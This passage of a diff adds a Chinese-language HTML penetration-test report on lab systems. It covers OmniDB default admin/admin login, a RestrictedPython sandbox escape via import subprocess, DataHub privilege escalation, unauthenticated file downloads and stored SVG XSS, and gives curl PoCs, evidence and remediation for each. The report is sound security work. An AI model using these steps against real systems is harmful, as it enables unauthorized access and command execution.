+<li>2. 对比未利用前基线，确认影响与报告一致（数据泄露/权限/文件内容等）。</li>
+</ol>
+<div class="row"><span class="k">节点关联</span><span>凭证节点 cred:datahub-admin-default（DataHub 默认口令 admin / lab-default，severity=critical）；foothold:datahub-superadmin-session（JWT UID=<redacted>，severity=high）。</span></div>
+</div></details>
+</div></article>
+
+<article class="vf crit" id="vuln-f_87c2cc7d635c">
+<div class="vhead">
+<div class="vtitle-row"><span class="sev-chip crit">严重</span><h3>OmniDB 3.0.3b 默认口令 admin / admin 进入后台</h3></div>
+<div class="vmeta">
+<span>类型 admin_access</span>
+<span>状态 <b style="color:var(--ok)">已验证</b></span>
+</div></div>
+<div class="vbody">
+<div class="vsec"><h4><span class="tick">①</span> 简介 / 技术成因</h4>
+<p>10.10.20.40:8999 上的 OmniDB 3.0.3b 对公网可达，文档默认口令 admin / admin 仍然有效，未做初始化强制修改（容器环境变量 OMNIDB_ADMIN_PASSWORD=<lab-default>）。</p>
+<p>登录接口正确调用格式为 x-www-form-urlencoded 字段 data=JSON：POST /sign_in/ → {"v_data": 0, "v_error": false} 并下发 omnidb_sessionid；GET /omnidb_login/?user=admin&pwd=admin → 302 /workspace（58692B，页面含 Connections/admin）。此前观察到的 sign_in 500 系 raw JSON 格式错误所致，并非口令错误。</p>
+<p>关联性：该后台会话是后续 Monitoring 沙箱逃逸（命令执行）的直接前置，配合「前端泄露数据库工具端点」完成从 DataHub 到 OmniDB 的攻击链贯通。</p>
+</div>
+<div class="vsec"><h4><span class="tick">②</span> 利用方式（编号分步复现）</h4><ol>
+<li>以 form data=JSON 格式调用登录接口：</li>
+<li>确认 v_data=0、v_error=false，携带会话访问 /workspace/ 进入后台。</li>
+</ol>
+<pre>curl -sk -c /tmp/omni.ck -b /tmp/omni.ck \
+ -H &#x27;X-CSRFToken: CSRF&#x27; -H &#x27;Content-Type: application/x-www-form-urlencoded&#x27; \
+ --data-urlencode &#x27;data={&quot;p_username&quot;:&quot;admin&quot;,&quot;p_pwd&quot;:&quot;admin&quot;}&#x27; \
+ http://10.10.20.40:8999/sign_in/
+# 预期 {"v_data": 0, "v_error": false} + omnidb_sessionid
+# 后续：GET /omnidb_login/?user=admin&amp;pwd=admin → 302 /workspace</pre>
+<p style="font-size:13px;color:var(--muted)"><b>前置条件：</b>攻击前置条件见验证证据、PoC 与关联节点。</p>
+<p style="font-size:13px;color:var(--muted)"><b>影响：</b>影响以已验证证据为准；应结合关联资产与权限边界进行复核。</p>
+</div>
+<div class="vsec"><h4><span class="tick g">③</span> 修复方式</h4><div class="fix-grid">
+<div class="fix-box"><h5 class="now">⚠ 立即缓解</h5><ul>
+<li>立即修改默认口令为强口令，并核查容器环境变量中的口令注入方式（移除 OMNIDB_ADMIN_PASSWORD=<lab-default> 之类的默认值）。</li>
+<li>将 8999 端口从公网收敛（防火墙白名单 / 内网化），数据库管理面禁止直接暴露。</li>
+<li>审计既有访问日志，排查异常登录与会话。</li>
+</ul></div>
+<div class="fix-box"><h5 class="root">✔ 根治</h5><ul>
+<li>首次启动强制初始化改密，禁止弱口令落地；启用双因素认证。</li>
+<li>数据库管理工具统一收敛至堡垒机/内网网关，经统一鉴权后再访问。</li>
+<li>组件升级至已修复相关问题的版本，并纳入漏洞情报跟踪。</li>
+</ul></div></div>
+</div>
+<details class="ev"><summary>证据 / PoC 复现（点击展开）</summary><div class="ev-body">
+<div class="row"><span class="k">证据</span><span>POST http://10.10.20.40:8999/sign_in/（application/x-www-form-urlencoded，data={"p_username":"admin","p_pwd":"admin"}）→ {"v_data": 0, "v_error": false} + omnidb_sessionid；GET /omnidb_login/?user=admin&amp;pwd=admin → 302 /workspace（58692B）。</span></div>
+<div class="row"><span class="k">验证细节</span><span>v_data=0 且 workspace 200（58692B），页面含 Connections/admin；线上复验 HTTP 200。</span></div>
+<div class="row"><span class="k">证明 URL</span><span class="mono"><a href="http://10.10.20.40:8999/workspace/" target="_blank" rel="noopener">http://10.10.20.40:8999/workspace/</a></span></div>
+<div class="row"><span class="k">PoC curl</span></div><pre>curl -sk -c /tmp/omni.ck -b /tmp/omni.ck -H &#x27;X-CSRFToken: CSRF&#x27; -H &#x27;Content-Type: application/x-www-form-urlencoded&#x27; --data-urlencode &#x27;data={&quot;p_username&quot;:&quot;admin&quot;,&quot;p_pwd&quot;:&quot;admin&quot;}&#x27; http://10.10.20.40:8999/sign_in/</pre>
+<div class="row"><span class="k">复现步骤</span></div><ol>
+<li>1. 使用下列 curl PoC 复现（按目标环境微调）：</li>
+<li>2. 对比未利用前基线，确认影响与报告一致（数据泄露/权限/文件内容等）。</li>
+</ol>
+<div class="row"><span class="k">节点关联</span><span>凭证节点 cred:omnidb-admin-admin（OmniDB 默认口令 admin / admin，severity=critical）；foothold:omnidb-admin-session（workspace 会话，severity=high）。</span></div>
+</div></details>
+</div></article>
+
+<article class="vf crit" id="vuln-f_c0af14cc0287">
+<div class="vhead">
+<div class="vtitle-row"><span class="sev-chip crit">严重</span><h3>DataHub Regular 角色可执行 SuperAdmin 写操作（含删管理员）</h3></div>
+<div class="vmeta">
+<span>类型 privilege_escalation</span>
+<span>状态 <b style="color:var(--ok)">已验证</b></span>
+</div></div>
+<div class="vbody">
+<div class="vsec"><h4><span class="tick">①</span> 简介 / 技术成因</h4>
+<p>DataHub 后端未按角色拦截 /api/user、/api/role、/api/dataset 等管理接口。用 SuperAdmin 创建 Regular 测试账号（probe_a，roleIds=[2]）后做权限差分：Regular 的 JWT 对用户 / 角色 / 权限树 / 数据集 / 上传清单的 GET 接口全部 code=0，写接口同样无 403 —— PATCH /api/user/1、DELETE /api/user/1、POST /api/user（roleIds=[1] 建 SuperAdmin）、PATCH /api/role/users/add/1、POST /api/role、PATCH /api/dataset/1、PATCH /api/dataset/allowupdate/1 均返回 code=0。</p>
+<p>实测 Regular 删除了原 admin（id=1）并覆盖数据集 1 元数据（部分字段 PATCH 会清空未提交列）。验证完成后已按快照回滚：重建 admin / lab-default（现 id=<n>，SuperAdmin）、恢复数据集 1 元数据、删除探测账号（probe_a、probe_b）与测试角色 Hax；原 admin 的 id/头像/创建时间无法原样恢复。</p>
+</div>
+<div class="vsec"><h4><span class="tick">②</span> 利用方式（编号分步复现）</h4><ol>
+<li>SuperAdmin 创建 Regular 测试账号并获取其 JWT：</li>
+<li>用 Regular JWT 遍历读接口：GET /api/user（total 含全部账号）、/api/role/page（含 SuperAdmin/Regular/Anonymous）；</li>
+<li>用 Regular JWT 调用写接口：PATCH /api/user/1、DELETE /api/user/1、POST /api/user（roleIds=[1]）等，均 code=0 无 403；</li>
+<li>验证完成后回滚：重建 admin、恢复数据集快照、删除测试账号与角色。</li>
+</ol>
+<pre># Regular 会话（$REG 为测试账号 JWT）：
+curl -sk -H &quot;Authorization: Bearer $REG&quot; https://data.lab.internal/api/user
+# GET /api/role/page 亦 code=0 且含 SuperAdmin 记录；写接口同样无角色校验</pre>
+<p style="font-size:13px;color:var(--muted)"><b>前置条件：</b>攻击前置条件见验证证据、PoC 与关联节点。</p>
+<p style="font-size:13px;color:var(--muted)"><b>影响：</b>影响以已验证证据为准；应结合关联资产与权限边界进行复核。</p>
+</div>
+<div class="vsec"><h4><span class="tick g">③</span> 修复方式</h4><div class="fix-grid">
+<div class="fix-box"><h5 class="now">⚠ 立即缓解</h5><ul>
+<li>对所有管理写接口（user / role / dataset）增加服务端角色校验，杜绝仅前端隐藏按钮的做法。</li>
+<li>复核当前账号与数据状态，确认测试期已回滚；对可能受影响的账号强制改密。</li>
+<li>开启管理操作审计日志，保留操作者与变更前后快照。</li>
+</ul></div>
+<div class="fix-box"><h5 class="root">✔ 根治</h5><ul>
+<li>落地 RBAC 权限模型：方法级鉴权（@RequireRole 等价物）统一拦截，禁止按接口手工判断。</li>
+<li>建立接口权限矩阵测试：每个角色 × 每个接口的自动化回归用例。</li>
+<li>高敏操作（删管理员、改角色）增加二次确认与审计告警。</li>
+</ul></div></div>
+</div>
+<details class="ev"><summary>证据 / PoC 复现（点击展开）</summary><div class="ev-body">
+<div class="row"><span class="k">证据</span><span>Regular GET /api/user total 含全部账号；GET /api/role/page 含 SuperAdmin/Regular/Anonymous；user/detail password=<redacted-hash>（测试口令 MD5）；写接口 PATCH/DELETE/POST 均 code=0 无 403。</span></div>
+<div class="row"><span class="k">验证细节</span><span>Regular GET /api/user 与 /api/role/page 均 code=0 且含 SuperAdmin 记录；实测 Regular 删除原 admin 并覆盖数据集 1 元数据，已按快照回滚。</span></div>
+<div class="row"><span class="k">证明 URL</span><span class="mono"><a href="https://data.lab.internal/api/role/page" target="_blank" rel="noopener">https://data.lab.internal/api/role/page</a></span></div>
+<div class="row"><span class="k">PoC curl</span></div><pre>curl -sk -H &quot;Authorization: Bearer $REG&quot; https://data.lab.internal/api/user</pre>
+<div class="row"><span class="k">复现步骤</span></div><ol>
+<li>1. 使用下列 curl PoC 复现（按目标环境微调）：</li>
+<li>2. 对比未利用前基线，确认影响与报告一致（数据泄露/权限/文件内容等）。</li>
+</ol>
+<div class="row"><span class="k">节点关联</span><span>漏洞节点 vuln:sdc-regular-vertical-authz（DataHub Regular 垂直越权：管理写接口无角色校验）；foothold:sdc-regular-to-superadmin（Regular 可接管 SuperAdmin）。</span></div>
+</div></details>
+</div></article>
+
+<article class="vf crit" id="vuln-node:vuln:omnidb-restrictedpython-rce">
+<div class="vhead">
+<div class="vtitle-row"><span class="sev-chip crit">严重</span><h3>OmniDB Monitoring RestrictedPython 沙箱可 import subprocess（命令执行）</h3></div>
+<div class="vmeta">
+<span>类型 rce</span>
+<span>状态 节点级记录</span>
+</div></div>
+<div class="vbody">
+<div class="vsec"><h4><span class="tick">①</span> 简介 / 技术成因</h4>
+<p>OmniDB Monitoring 的 test_monitor_script 在 OmniDB 进程内以 compile_restricted + exec 方式执行用户提交的 Python 脚本，其沙箱钩子 _hook_import 只拦截 name=='os'，不拦截 subprocess / posix，因此可借 import subprocess 直接调用系统命令。</p>
+<p>p_database_index 置 null 即可触发，无需连接任何业务数据库。已回显 uid=101(omnidb) @ lab-node-01，与下一条「服务器权限落地」构成完整证据链（本条为节点级记录，落地证据见下条）。</p>
+</div>
+<div class="vsec"><h4><span class="tick">②</span> 利用方式（编号分步复现）</h4><ol>
+<li>以默认口令进入 OmniDB 后台（见严重项 02）；</li>
+<li>在 Monitoring / test_monitor_script 中提交含 import subprocess 的脚本，p_database_index 置 null；</li>
+<li>执行后命令输出在监控脚本回显中可见（id / hostname / pwd）。</li>
+</ol>
+<p style="font-size:13px;color:var(--muted)"><b>PoC：</b>本条未提供独立 poc_curl，依据上述证据片段手工构造请求复现。</p>
+<p style="font-size:13px;color:var(--muted)"><b>影响：</b>影响以已验证证据为准；应结合关联资产与权限边界进行复核。</p>
+</div>
+<div class="vsec"><h4><span class="tick g">③</span> 修复方式</h4><div class="fix-grid">
+<div class="fix-box"><h5 class="now">⚠ 立即缓解</h5><ul>
+<li>关闭或白名单化 Monitoring 脚本执行功能，禁止提交任意 Python 脚本。</li>
+<li>升级 / 修补 OmniDB 至不受该沙箱缺陷影响的版本。</li>
+<li>将 8999 端口收敛至内网，限制数据库管理面公网可达。</li>
+</ul></div>
+<div class="fix-box"><h5 class="root">✔ 根治</h5><ul>
+<li>移除动态命令拼接；执行通道参数化并采用严格 allowlist。</li>
+<li>关闭不必要执行能力，服务以最小权限运行并定期修补组件。</li>
+<li>对脚本执行类功能做「结果只读、无副作用」约束与审计。</li>
+</ul></div></div>
+</div>
+<details class="ev"><summary>证据 / 详情（点击展开）</summary><div class="ev-body">
+<div class="row"><span class="k">证据</span><span>_hook_import 只禁 name=='os'，不禁 subprocess/posix；test_monitor_script 在 OmniDB 进程内 compile_restricted+exec，p_database_index=null 即可，无需业务库连接；已回显 uid=101(omnidb) @ lab-node-01。</span></div>
+<div class="row"><span class="k">复现步骤</span></div><ol>
+<li>1. 依据证据片段手工构造请求复现（本条未提供独立 poc_curl）。</li>
+<li>2. 对比未利用前基线，确认影响与报告一致（数据泄露/权限/文件内容等）。</li>
+</ol>
+<div class="row"><span class="k">节点关联</span><span>漏洞节点 vuln:omnidb-restrictedpython-rce；与 foothold:omnidb-container-shell（容器内 omnidb 用户命令执行）联动，落地证据见严重项 05。</span></div>
+</div></details>
+</div></article>
+
+<article class="vf crit" id="vuln-f_c89738ca8884">
+<div class="vhead">
+<div class="vtitle-row"><span class="sev-chip crit">严重</span><h3>服务器权限 (omnidb)：OmniDB RestrictedPython 沙箱执行系统命令</h3></div>
+<div class="vmeta">
+<span>类型 rce</span>
+<span>状态 <b style="color:var(--ok)">已验证</b></span>
+</div></div>
+<div class="vbody">
+<div class="vsec"><h4><span class="tick">①</span> 简介 / 技术成因</h4>
+<p>承接严重项 02 / 04：默认口令进入 OmniDB 后台后，在 Monitoring test_monitor_script 中经 RestrictedPython 沙箱执行 import subprocess 调用系统命令，完成权限落地。</p>
+<p>已通过漏洞通道写入短 txt canary 文件（内容含 canary 标识与 id / hostname / pwd 回显），落盘 static 目录后经 HTTP 匿名取回：GET http://10.10.20.40:8999/static/OmniDB_app/.well-known/labcanary01.txt → HTTP 200 text/plain（127B），正文含同一 canary 与 id: uid=101(omnidb) gid=102(omnidb)、hostname: lab-node-01、pwd: /home/omnidb/OmniDB/OmniDB。复验通过（canary 匹配）。</p>
+<p>即攻击者可在目标进程权限范围内执行任意命令，进一步读取数据、横向移动或持续控制；本条为本次测试的权限落地终点。</p>
+</div>
+<div class="vsec"><h4><span class="tick">②</span> 利用方式（编号分步复现）</h4><ol>
+<li>（命令执行）用漏洞通道写入短 txt，内容为 canary `labcanary01`；</li>
+<li>访问 `http://10.10.20.40:8999/static/OmniDB_app/.well-known/labcanary01.txt`，确认响应体包含同一 canary；</li>
+<li>使用下列 curl PoC 复现（按目标环境微调）。</li>
+</ol>
+<pre>curl -sk http://10.10.20.40:8999/static/OmniDB_app/.well-known/labcanary01.txt
+# 预期 HTTP 200 text/plain 127B，正文：
+# labcanary01
+# id: uid=101(omnidb) gid=102(omnidb) groups=102(omnidb)
+# hostname: lab-node-01
+# pwd: /home/omnidb/OmniDB/OmniDB</pre>
+<p style="font-size:13px;color:var(--muted)"><b>前置条件：</b>攻击者可访问对应输入点，且目标路径/解释器/执行条件满足。</p>
+<p style="font-size:13px;color:var(--muted)"><b>影响：</b>攻击者可能在目标进程权限范围内执行任意命令，并进一步读取数据、横向移动或持续控制。</p>
+</div>
+<div class="vsec"><h4><span class="tick g">③</span> 修复方式</h4><div class="fix-grid">
+<div class="fix-box"><h5 class="now">⚠ 立即缓解</h5><ul>
+<li>立即升级 / 修补 OmniDB，移除 Monitoring 脚本执行缺陷；在修复前关闭该功能。</li>
+<li>排查容器内已执行命令痕迹，轮换容器内暴露的凭据与密钥。</li>
+<li>将 8999 从公网收敛，限制数据库管理工具暴露面。</li>
+</ul></div>
+<div class="fix-box"><h5 class="root">✔ 根治</h5><ul>
+<li>移除动态命令拼接；使用参数化 API 与严格 allowlist；关闭不必要执行能力。</li>
+<li>以最小权限运行服务（非 root、只读挂载），并修补相关组件。</li>
+<li>对脚本执行类功能建立审计与告警，检测异常 import / 命令调用。</li>
+</ul></div></div>
+</div>
+<details class="ev"><summary>证据 / PoC 复现（点击展开）</summary><div class="ev-body">
+<div class="row"><span class="k">证据</span><span>OmniDB RestrictedPython 命令执行；canary txt 已写入并含 id/hostname/pwd 回显。GET http://10.10.20.40:8999/static/OmniDB_app/.well-known/labcanary01.txt → labcanary01 / id: uid=101(omnidb) gid=102(omnidb) groups=102(omnidb) / hostname: lab-node-01 / pwd: /home/omnidb/OmniDB/OmniDB。</span></div>
+<div class="row"><span class="k">验证细节</span><span>HTTP 200 text/plain 127B，正文含 canary 与 id 输出；线上复验 canary 匹配（canary_ok）。</span></div>
+<div class="row"><span class="k">证明 URL</span><span class="mono"><a href="http://10.10.20.40:8999/static/OmniDB_app/.well-known/labcanary01.txt" target="_blank" rel="noopener">http://10.10.20.40:8999/static/OmniDB_app/.well-known/labcanary01.txt</a></span></div>
+<div class="row"><span class="k">PoC curl</span></div><pre>curl -sk http://10.10.20.40:8999/static/OmniDB_app/.well-known/labcanary01.txt</pre>
+<div class="row"><span class="k">复现步骤</span></div><ol>
+<li>1. （命令执行）用漏洞通道写入短 txt，内容为 canary `labcanary01`。</li>
+<li>2. 浏览器或 curl 访问上述 URL，确认响应体包含同一 canary。</li>
+<li>3. 对比未利用前基线，确认影响与报告一致（数据泄露/权限/文件内容等）。</li>
+</ol>
+<div class="row"><span class="k">节点关联</span><span>目标节点 goal:shell（服务器权限 (omnidb) @ 10.10.20.40，severity=critical）与立足点 foothold:omnidb-container-shell（容器内 omnidb 用户命令执行）。</span></div>
+</div></details>
+</div></article>
+<!-- /SLOT:findings-critical -->
+</section>
+<section class="sec" id="high">
+<div class="sec-head"><span class="num">07</span><h2>高危漏洞（High · 8 项）</h2><span class="en">High Findings — 简介 / 利用 / 修复 全文</span></div>
+
+<!-- SLOT:findings-high -->
+<p class="sec-sub">高危项共 8 项：DataHub 上传链路 4 项（未授权读 / 鉴权上传公开回读 / 存储型 SVG XSS / 环视视频）、敏感字段暴露 1 项、AnnoApp 源码与镜像泄露 2 项、GitLab 开放注册 1 项。均附证据与复现路径。</p>
+<article class="vf high" id="vuln-f_59b55f20c8bf">
+<div class="vhead">
+<div class="vtitle-row"><span class="sev-chip high">高危</span><h3>DataHub 上传目录未授权可读（含 HDF5）</h3></div>
+<div class="vmeta">
+<span>类型 unauth</span>
+<span>状态 <b style="color:var(--ok)">已验证</b></span>
+</div></div>
+<div class="vbody">
+<div class="vsec"><h4><span class="tick">①</span> 简介 / 技术成因</h4>
+<p>DataHub 的 /api/uploads/* 静态文件服务无任何鉴权：GET /api/uploads/image/admin.png → 200（5576B PNG）、/api/uploads/image/portal.png → 200（111720B）、/api/uploads/h5/test_example.h5 → 200（19232B，file 识别为 HDF5，魔数 \x89HDF）。响应头 Access-Control-Allow-Origin: *。</p>
+<p>列表接口仍需 token，但文件名已知 / 可猜测时即可直链下载；与「鉴权上传 + 公开回读」叠加后，任何登录上传的文件均可能被匿名读取。</p>
+</div>
+<div class="vsec"><h4><span class="tick">②</span> 利用方式（编号分步复现）</h4><ol>
+<li>无需任何凭据，直接请求上传目录静态资源：</li>
+<li>确认 200 与文件魔数（HDF5 头 89 48 44 46）。</li>
+</ol>
+<pre>curl -sk -D- -o /tmp/test_example.h5 https://data.lab.internal/api/uploads/h5/test_example.h5 &amp;&amp; file /tmp/test_example.h5</pre>
+<p style="font-size:13px;color:var(--muted)"><b>前置条件：</b>攻击前置条件见验证证据、PoC 与关联节点。</p>
+<p style="font-size:13px;color:var(--muted)"><b>影响：</b>影响以已验证证据为准；应结合关联资产与权限边界进行复核。</p>
+</div>
+<div class="vsec"><h4><span class="tick g">③</span> 修复方式</h4><div class="fix-grid">
+<div class="fix-box"><h5 class="now">⚠ 立即缓解</h5><ul>
+<li>上传目录立即改为需鉴权的受控下载接口，禁止静态直出。</li>
+<li>对已公开可读的存量文件做访问审计与必要下线。</li>
+</ul></div>
+<div class="fix-box"><h5 class="root">✔ 根治</h5><ul>
+<li>上传文件存放于 Web 根之外 / 对象存储私有桶，下载经应用层鉴权与签名 URL。</li>
+<li>文件名随机化，禁止沿用用户可控文件名。</li>
+<li>CORS 按域名白名单收紧，禁止 *。</li>
+</ul></div></div>
+</div>
+<details class="ev"><summary>证据 / PoC 复现（点击展开）</summary><div class="ev-body">
+<div class="row"><span class="k">证据</span><span>GET /api/uploads/h5/test_example.h5 → 200 Content-Length 19232，魔数 89 48 44 46（HDF5）；GET /api/uploads/image/admin.png → 200 5576 PNG；响应含 Access-Control-Allow-Origin: *。</span></div>
+<div class="row"><span class="k">验证细节</span><span>HTTP 200 HDF5 19232 bytes，无 Authorization；线上复验通过。</span></div>
+<div class="row"><span class="k">证明 URL</span><span class="mono"><a href="https://data.lab.internal/api/uploads/h5/test_example.h5" target="_blank" rel="noopener">https://data.lab.internal/api/uploads/h5/test_example.h5</a></span></div>
+<div class="row"><span class="k">PoC curl</span></div><pre>curl -sk -D- -o /tmp/test_example.h5 https://data.lab.internal/api/uploads/h5/test_example.h5 &amp;&amp; file /tmp/test_example.h5</pre>
+<div class="row"><span class="k">复现步骤</span></div><ol>
+<li>1. 使用下列 curl PoC 复现（按目标环境微调）：</li>
+<li>2. 对比未利用前基线，确认影响与报告一致（数据泄露/权限/文件内容等）。</li>
+</ol>
+<div class="row"><span class="k">节点关联</span><span>漏洞节点 vuln:sdc-unauth-uploads（DataHub /api/uploads/* 未授权静态文件可读）。</span></div>
+</div></details>
+</div></article>
+
+<article class="vf high" id="vuln-f_53ab480c47e5">
+<div class="vhead">
+<div class="vtitle-row"><span class="sev-chip high">高危</span><h3>DataHub 登录后可上传文件且未授权可读回（txt canary）</h3></div>
+<div class="vmeta">
+<span>类型 file_upload</span>
+<span>状态 <b style="color:var(--ok)">已验证</b></span>
+</div></div>
+<div class="vbody">
+<div class="vsec"><h4><span class="tick">①</span> 简介 / 技术成因</h4>
+<p>SuperAdmin 会话可 POST /api/upload/h5/single 上传任意文件，上传产物落在 /api/uploads/* 静态目录并被匿名读取：无 token GET /api/uploads/h5/lab_canary.txt → 200 text/plain 回显 lab-canary；DELETE /api/upload/{id} 删除成功。</p>
+<p>.php / .html 后缀上传被前置 WAF 拦截，证明「任意文件写（至少非可执行扩展）+ 公开读」成立。与存储型 SVG XSS（见高危项 03）叠加，可形成「写入 → 公开读取 → 会话窃取」完整利用链。</p>
+</div>
+<div class="vsec"><h4><span class="tick">②</span> 利用方式（编号分步复现）</h4><ol>
+<li>登录后上传 lab_canary.txt（POST /api/upload/h5/single）；</li>
+<li>匿名读取：无 token GET /api/uploads/h5/lab_canary.txt → 回显 lab-canary；</li>
+<li>验证后 DELETE /api/upload/{id} 清理。</li>
+</ol>
+<pre>curl -sk https://data.lab.internal/api/uploads/h5/lab_canary.txt
+# 预期 200 text/plain：lab-canary</pre>
+<p style="font-size:13px;color:var(--muted)"><b>前置条件：</b>上传入口可访问，且服务端仅依赖文件名、MIME 或前端校验。</p>
+<p style="font-size:13px;color:var(--muted)"><b>影响：</b>攻击者可能上传可执行或敏感文件，形成代码执行或数据覆盖风险。</p>
+</div>
+<div class="vsec"><h4><span class="tick g">③</span> 修复方式</h4><div class="fix-grid">
+<div class="fix-box"><h5 class="now">⚠ 立即缓解</h5><ul>
+<li>对上传内容做服务端校验与重编码，不信任文件名 / MIME / 前端校验。</li>
+<li>上传目录置于 Web 根之外，禁止静态直出；删除已上传的 canary 文件。</li>
+</ul></div>
+<div class="fix-box"><h5 class="root">✔ 根治</h5><ul>
+<li>使用随机文件名、最小权限与下载白名单。</li>
+<li>上传接口增加大小限制与频控；文件下载统一走鉴权网关。</li>
+</ul></div></div>
+</div>
+<details class="ev"><summary>证据 / PoC 复现（点击展开）</summary><div class="ev-body">
+<div class="row"><span class="k">证据</span><span>GET https://data.lab.internal/api/uploads/h5/lab_canary.txt → lab-canary（无 token 200 text/plain）。</span></div>
+<div class="row"><span class="k">验证细节</span><span>SuperAdmin 上传 txt 成功；匿名读取回显 canary；DELETE 清理成功；.php/.html 被前置 WAF 拦截；线上复验 canary 匹配。</span></div>
+<div class="row"><span class="k">证明 URL</span><span class="mono"><a href="https://data.lab.internal/api/uploads/h5/lab_canary.txt" target="_blank" rel="noopener">https://data.lab.internal/api/uploads/h5/lab_canary.txt</a></span></div>
+<div class="row"><span class="k">PoC curl</span></div><pre>curl -sk https://data.lab.internal/api/uploads/h5/lab_canary.txt</pre>
+<div class="row"><span class="k">复现步骤</span></div><ol>
+<li>1. 登录后上传短 txt（内容含约定 canary）。</li>
+<li>2. 浏览器或 curl 匿名访问上述 URL，确认响应体包含同一 canary。</li>
+<li>3. 验证完成后删除上传文件。</li>
+</ol>
+<div class="row"><span class="k">节点关联</span><span>漏洞节点 vuln:sdc-authed-upload-unauth-read（DataHub 鉴权上传 + 未授权回读，可写 txt canary）。</span></div>
+</div></details>
+</div></article>
+
+<article class="vf high" id="vuln-f_694ed9836e75">
+<div class="vhead">
+<div class="vtitle-row"><span class="sev-chip high">高危</span><h3>DataHub 存储型 SVG XSS（上传后未授权以 image/svg+xml 回读）</h3></div>
+<div class="vmeta">
+<span>类型 xss</span>
+<span>状态 <b style="color:var(--ok)">已验证</b></span>
+</div></div>
+<div class="vbody">
+<div class="vsec"><h4><span class="tick">①</span> 简介 / 技术成因</h4>
+<p>鉴权上传 .svg 成功，GET /api/uploads/h5/sa_xss_canary.svg 无鉴权返回 200，Content-Type: image/svg+xml，正文完整返回含 onload= 的 SVG；响应头 CORS *。</p>
+<p>攻击者可将恶意 SVG 上传至公开目录，诱使打开链接的管理员浏览器执行其中脚本 —— SVG 以 image/svg+xml 独立文档加载时脚本可执行，可窃取 SuperAdmin 会话。已用短 canary SVG 验证后删除，未留持久恶意文件。</p>
+</div>
+<div class="vsec"><h4><span class="tick">②</span> 利用方式（编号分步复现）</h4><ol>
+<li>登录后上传含 onload= 脚本的 SVG 到 /api/upload/h5/single；</li>
+<li>匿名访问 /api/uploads/h5/&lt;file&gt;.svg：</li>
+<li>确认响应 Content-Type: image/svg+xml 且正文含上传内容（canary）。</li>
+</ol>
+<pre>curl -sk -D- https://data.lab.internal/api/uploads/h5/sa_xss_canary.svg
+# 预期 Content-Type: image/svg+xml，正文含上传 SVG 与 canary</pre>
+<p style="font-size:13px;color:var(--muted)"><b>前置条件：</b>攻击前置条件见验证证据、PoC 与关联节点。</p>
+<p style="font-size:13px;color:var(--muted)"><b>影响：</b>影响以已验证证据为准；应结合关联资产与权限边界进行复核。</p>
+</div>
+<div class="vsec"><h4><span class="tick g">③</span> 修复方式</h4><div class="fix-grid">
+<div class="fix-box"><h5 class="now">⚠ 立即缓解</h5><ul>
+<li>上传类型白名单，拒绝 SVG / HTML 等活性文档类型，或上传后强制重编码为位图。</li>
+<li>下载响应增加 Content-Disposition: attachment 与 X-Content-Type-Options: nosniff。</li>
+</ul></div>
+<div class="fix-box"><h5 class="root">✔ 根治</h5><ul>
+<li>上传存储与展示域名隔离，展示面按静态位图托管。</li>
+<li>若必须支持 SVG，做 allowlist 标签 / 属性消毒后再存储。</li>
+<li>CSP 收紧，禁止通配来源。</li>
+</ul></div></div>
+</div>
+<details class="ev"><summary>证据 / PoC 复现（点击展开）</summary><div class="ev-body">
+<div class="row"><span class="k">证据</span><span>GET https://data.lab.internal/api/uploads/h5/sa_xss_canary.svg → Content-Type: image/svg+xml；body 含上传 SVG 与 canary（sa-xss-canary）。</span></div>
+<div class="row"><span class="k">验证细节</span><span>SuperAdmin 上传 SVG 成功；匿名 200 image/svg+xml，正文完整返回；CORS *；验证后已删除；线上复验 canary 匹配。</span></div>
+<div class="row"><span class="k">证明 URL</span><span class="mono"><a href="https://data.lab.internal/api/uploads/h5/sa_xss_canary.svg" target="_blank" rel="noopener">https://data.lab.internal/api/uploads/h5/sa_xss_canary.svg</a></span></div>
+<div class="row"><span class="k">PoC curl</span></div><pre>curl -sk -D- https://data.lab.internal/api/uploads/h5/sa_xss_canary.svg</pre>
+<div class="row"><span class="k">复现步骤</span></div><ol>
+<li>1. 使用下列 curl PoC 复现（按目标环境微调）：</li>
+<li>2. 对比未利用前基线，确认影响与报告一致（数据泄露/权限/文件内容等）。</li>
+</ol>
+<div class="row"><span class="k">节点关联</span><span>漏洞节点 vuln:sdc-stored-svg-xss（DataHub 存储型 SVG XSS，未授权可读）。</span></div>
+</div></details>
+</div></article>
+
+<article class="vf high" id="vuln-f_6cd64daa6622">
+<div class="vhead">
+<div class="vtitle-row"><span class="sev-chip high">高危</span><h3>DataHub 车载环视视频未授权可下载（/api/uploads/video/*）</h3></div>
+<div class="vmeta">
+<span>类型 unauth</span>
+<span>状态 <b style="color:var(--ok)">已验证</b></span>
+</div></div>
+<div class="vbody">
+<div class="vsec"><h4><span class="tick">①</span> 简介 / 技术成因</h4>
+<p>GET /api/uploads/video/60bl_merged.mp4 → 200 video/mp4，无需任何 Authorization；同类 60/120° × bl/br/fl/fr 共 8 个 *_merged.mp4（约 0.4–0.8MB/个）均可直链下载，属车载环视采集数据。</p>
+<p>与 image / h5 未授权读同根因（上传目录静态直出、无鉴权），但涉及车辆环视场景视频，敏感度更高。</p>
+</div>
+<div class="vsec"><h4><span class="tick">②</span> 利用方式（编号分步复现）</h4><ol>
+<li>匿名 HEAD / GET 视频直链：</li>
+<li>确认 200 video/mp4 无需凭据。</li>
+</ol>
+<pre>curl -sk -I https://data.lab.internal/api/uploads/video/60bl_merged.mp4
+# 预期 HTTP 200 video/mp4（无 Authorization）</pre>
+<p style="font-size:13px;color:var(--muted)"><b>前置条件：</b>攻击前置条件见验证证据、PoC 与关联节点。</p>
+<p style="font-size:13px;color:var(--muted)"><b>影响：</b>影响以已验证证据为准；应结合关联资产与权限边界进行复核。</p>
+</div>
+<div class="vsec"><h4><span class="tick g">③</span> 修复方式</h4><div class="fix-grid">
+<div class="fix-box"><h5 class="now">⚠ 立即缓解</h5><ul>
+<li>video 上传目录立即加鉴权，禁止静态直出。</li>
+<li>评估已公开直链是否涉敏感场景数据，必要时下线。</li>
+</ul></div>
+<div class="fix-box"><h5 class="root">✔ 根治</h5><ul>
+<li>与上传目录修复同源：对象存储私有桶 + 应用层签名下载。</li>
+<li>对视频类上传单独设置访问策略与审计。</li>
+</ul></div></div>
+</div>
+<details class="ev"><summary>证据 / PoC 复现（点击展开）</summary><div class="ev-body">
+<div class="row"><span class="k">证据</span><span>GET /api/uploads/video/60bl_merged.mp4 → 200 video/mp4（及 60/120° 其他 7 个）。</span></div>
+<div class="row"><span class="k">验证细节</span><span>无 token 可 GET，HTTP 200 video/mp4；线上复验通过。</span></div>
